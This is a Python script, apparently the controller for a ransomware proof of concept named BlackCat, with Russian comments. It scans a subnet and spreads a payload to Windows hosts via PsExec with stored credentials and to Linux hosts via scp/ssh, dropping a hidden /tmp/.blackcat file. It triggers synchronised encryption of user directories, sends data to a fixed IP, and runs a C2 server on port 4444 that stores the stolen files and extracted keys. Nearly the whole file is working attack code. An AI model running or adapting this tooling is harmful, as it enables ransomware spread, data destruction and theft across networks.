#!/usr/bin/env python3
"""
BlackCat Attack Controller
Управляет распространением и синхронизированным шифрованием
"""

import json
import subprocess
import time
import socket
import threading
from datetime import datetime
import os

class BlackCatController:
    def __init__(self, config_file="network_config.json"):
        self.config_file = config_file
        self.infected_hosts = []
        self.sync_id = None
        self.encryption_time = None
        
    def load_config(self):
        """Загрузка конфигурации"""
        with open(self.config_file, 'r') as f:
            return json.load(f)
    
    def scan_network(self, subnet, start_ip, end_ip):
        """Сканирование сети для обнаружения хостов"""
        hosts = []
        base = subnet.rsplit('.', 1)[0]
        
        print(f"[*] Scanning network {subnet}...")
        
        for i in range(start_ip, end_ip + 1):
            ip = f"{base}.{i}"
            if self.ping_host(ip):
                # Определяем ОС по открытым портам
                os_type = self.detect_os(ip)
                if os_type:
                    hosts.append({"ip": ip, "os": os_type})
                    print(f"[+] Found {os_type} host: {ip}")
        
        print(f"[*] Scan complete. Found {len(hosts)} hosts")
        return hosts
    
    def ping_host(self, ip):
        """Проверка доступности хоста"""
        try:
            subprocess.run(["ping", "-c", "1", "-W", "1", ip], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         check=True)
            return True
        except:
            return False
    
    def detect_os(self, ip):
        """Определение ОС по открытым портам"""
        # Проверяем Windows порты
        windows_ports = [445, 135, 139, 3389]
        for port in windows_ports:
            if self.check_port(ip, port):
                return "Windows"
        
        # Проверяем Linux порты
        linux_ports = [22, 2222]
        for port in linux_ports:
            if self.check_port(ip, port):
                return "Linux"
        
        return None
    
    def check_port(self, ip, port, timeout=1):
        """Проверка открытого порта"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def infect_windows_host(self, ip, username, password, payload_path, args):
        """Заражение Windows хоста через PsExec"""
        try:
            # Формируем команду PsExec
            cmd = [
                "assets/PsExec.exe",
                f"\\\\{ip}",
                "-u", username,
                "-p", password,
                "-h", "-s", "-d", "-c", "-f",
                payload_path
            ]
            
            # Добавляем аргументы
            cmd.extend(args)
            
            print(f"[*] Attempting to infect Windows host {ip} with {username}:{password}")
            
            # Запускаем в отдельном потоке
            thread = threading.Thread(
                target=self.run_command,
                args=(cmd, ip, "Windows")
            )
            thread.start()
            
            return True
            
        except Exception as e:
            print(f"[-] Failed to infect {ip}: {e}")
            return False
    
    def infect_linux_host(self, ip, ssh_key, payload_path, args):
        """Заражение Linux хоста через SSH"""
        try:
            # Копируем payload
            scp_cmd = [
                "scp", "-i", ssh_key,
                "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=10",
                payload_path,
                f"{ip}:/tmp/.blackcat"
            ]
            
            subprocess.run(scp_cmd, check=True, 
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
            
            # Запускаем payload
            ssh_cmd = [
                "ssh", "-i", ssh_key,
                "-o", "StrictHostKeyChecking=no",
                ip,
                f"chmod +x /tmp/.blackcat && /tmp/.blackcat {' '.join(args)} &"
            ]
            
            thread = threading.Thread(
                target=self.run_command,
                args=(ssh_cmd, ip, "Linux")
            )
            thread.start()
            
            return True
            
        except Exception as e:
            print(f"[-] Failed to infect Linux host {ip}: {e}")
            return False
    
    def run_command(self, cmd, ip, os_type):
        """Запуск команды и обработка результата"""
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Successfully infected {os_type} host: {ip}")
                self.infected_hosts.append({
                    "ip": ip,
                    "os": os_type,
                    "infected_at": datetime.now().isoformat()
                })
            else:
                print(f"[-] Failed to infect {ip}: {result.stderr}")
        except Exception as e:
            print(f"[-] Error infecting {ip}: {e}")
    
    def synchronized_attack(self, delay_minutes=5):
        """Выполнение синхронизированной атаки"""
        config = self.load_config()
        
        # Генерируем sync_id
        import random
        self.sync_id = f"sync_{random.randint(100000, 999999)}"
        self.encryption_time = int(time.time()) + (delay_minutes * 60)
        
        print(f"[*] Starting synchronized attack")
        print(f"[*] Sync ID: {self.sync_id}")
        print(f"[*] Encryption time: {datetime.fromtimestamp(self.encryption_time)}")
        
        # Сканируем сеть
        subnet = config["subnet"]
        hosts = self.scan_network(subnet, 11, 254)
        
        if not hosts:
            print("[-] No hosts found")
            return
        
        # Загружаем учетные данные
        credentials = config["credentials"]
        ssh_keys = config["ssh_keys"]
        
        # Определяем путь к payload
        payload_path = "./blackcat-poc"
        if not os.path.exists(payload_path):
            # Ищем в target директории
            for root, dirs, files in os.walk("."):
                if "blackcat-poc" in files:
                    payload_path = os.path.join(root, "blackcat-poc")
                    break
        
        # Формируем аргументы для ransomware
        args = [
            "encrypt",
            "--path", "C:\\Users" if os.name == 'nt' else "/home",
            "--sync-id", self.sync_id,
            "--encryption-time", str(self.encryption_time),
            "--sync",
            "--exfiltrate", "192.168.53.135"
        ]
        
        # Заражаем хосты
        print(f"[*] Infecting {len(hosts)} hosts...")
        
        for host in hosts:
            if host["os"] == "Windows":
                # Пробуем все учетные данные
                for cred in credentials:
                    if self.infect_windows_host(
                        host["ip"],
                        cred["username"],
                        cred["password"],
                        payload_path,
                        args
                    ):
                        break
            else:  # Linux
                # Пробуем все SSH ключи
                for ssh_key in ssh_keys:
                    if os.path.exists(ssh_key):
                        if self.infect_linux_host(
                            host["ip"],
                            ssh_key,
                            payload_path,
                            args
                        ):
                            break
        
        # Ждем время шифрования
        print(f"[*] Waiting for encryption time...")
        time.sleep(delay_minutes * 60)
        
        print(f"[*] Synchronized attack completed!")
        print(f"[*] Total infected hosts: {len(self.infected_hosts)}")
        
        # Сохраняем отчет
        self.save_report()
    
    def save_report(self):
        """Сохранение отчета об атаке"""
        report = {
            "sync_id": self.sync_id,
            "encryption_time": self.encryption_time,
            "infected_hosts": self.infected_hosts,
            "timestamp": datetime.now().isoformat()
        }
        
        filename = f"attack_report_{self.sync_id}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Report saved to {filename}")
    
    def start_c2_server(self, port=4444):
        """Запуск C2 сервера для приема эксфильтрированных данных"""
        import socketserver
        
        class C2Handler(socketserver.BaseRequestHandler):
            def handle(self):
                print(f"[+] Connection from {self.client_address[0]}")
                try:
                    # Получаем данные
                    data = self.request.recv(1024 * 1024)  # 1MB максимум
                    
                    if data:
                        # Генерируем имя файла с timestamp
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"exfil_{self.client_address[0]}_{timestamp}.enc"
                        
                        # Сохраняем
                        with open(filename, 'wb') as f:
                            f.write(data)
                        
                        print(f"[+] Saved {len(data)} bytes to {filename}")
                        
                        # Пытаемся извлечь ключ из имени файла
                        if "key_" in filename:
                            key_part = filename.split("key_")[1].split("_")[0]
                            print(f"[*] Possible encryption key in filename: {key_part}")
                            
                            # Сохраняем ключ в отдельный файл
                            with open("extracted_keys.txt", "a") as key_file:
                                key_file.write(f"{timestamp} - {key_part} - {filename}\n")
                    
                except Exception as e:
                    print(f"[-] Error: {e}")
        
        print(f"[*] Starting C2 server on port {port}")
        server = socketserver.TCPServer(("0.0.0.0", port), C2Handler)
        server.serve_forever()

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="BlackCat Attack Controller")
    parser.add_argument("--scan", action="store_true", help="Scan network")
    parser.add_argument("--attack", action="store_true", help="Start synchronized attack")
    parser.add_argument("--c2", action="store_true", help="Start C2 server")
    parser.add_argument("--config", default="network_config.json", help="Configuration file")
    parser.add_argument("--subnet", default="192.168.53.0", help="Network subnet")
    parser.add_argument("--delay", type=int, default=5, help="Delay before encryption (minutes)")
    
    args = parser.parse_args()
    
    controller = BlackCatController(args.config)
    
    if args.scan:
        hosts = controller.scan_network(args.subnet, 11, 254)
        print(f"\n[*] Scan results:")
        for host in hosts:
            print(f"  - {host['ip']} ({host['os']})")
    
    elif args.attack:
        controller.synchronized_attack(args.delay)
    
    elif args.c2:
        controller.start_c2_server()
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()